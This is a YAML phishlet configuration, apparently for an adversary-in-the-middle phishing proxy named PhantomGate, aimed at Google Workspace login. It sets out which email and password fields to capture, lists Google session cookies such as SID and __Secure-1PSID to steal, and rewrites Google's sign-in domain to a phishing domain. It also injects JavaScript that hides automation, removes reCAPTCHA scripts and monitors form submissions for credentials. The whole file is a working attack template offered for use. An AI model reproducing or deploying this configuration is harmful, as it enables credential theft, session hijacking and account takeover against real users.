name: Google Workspace
author: PhantomGate
version: 2.0.0
description: Google Workspace / G Suite authentication - Pixel-perfect replica

auth:
  domains:
    - accounts.google.com
    - myaccount.google.com
    - mail.google.com
    - drive.google.com
  
  login:
    domain: accounts.google.com
    path: /signin/v2/identifier
    username:
      selector: "input[type='email']"
      capture: true
    password:
      selector: "input[type='password']"
      capture: true
  
  tokens:
    cookies:
      - name: SID
        regex: ".*"
      - name: SSID
        regex: ".*"
      - name: HSID
        regex: ".*"
      - name: APISID
        regex: ".*"
      - name: SAPISID
        regex: ".*"
      - name: __Secure-1PSID
        regex: ".*"
      - name: __Secure-3PSID
        regex: ".*"
      - name: __Secure-1PSIDTS
        regex: ".*"
      - name: __Secure-3PSIDTS
        regex: ".*"
      - name: NID
        regex: ".*"
      - name: 1P_JAR
        regex: ".*"

proxy:
  hosts:
    - domain: accounts.google.com
      inject: true
    - domain: myaccount.google.com
      inject: true
    - domain: mail.google.com
      inject: true
    - domain: drive.google.com
      inject: true
  
  sub_filters:
    - domain: accounts.google.com
      search: "https://accounts.google.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - Google Workspace
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
      
      // Remove Google detection scripts
      var scripts = document.querySelectorAll('script');
      scripts.forEach(function(script) {
        if (script.src && script.src.includes('recaptcha')) {
          script.remove();
        }
      });
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var email = form.querySelector('input[type="email"]');
        var password = form.querySelector('input[type="password"]');
        if (email && password) {
          console.log('[PhantomGate] Google credentials captured');
        }
      }, true);
      
      // Monitor for password field appearance
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.addedNodes.length) {
            var node = mutation.addedNodes[0];
            if (node.nodeType === 1) {
              var pwd = node.querySelector('input[type="password"]');
              if (pwd) {
                console.log('[PhantomGate] Password field detected');
              }
            }
          }
        });
      });
      
      observer.observe(document.body, {childList: true, subtree: true});
    })();
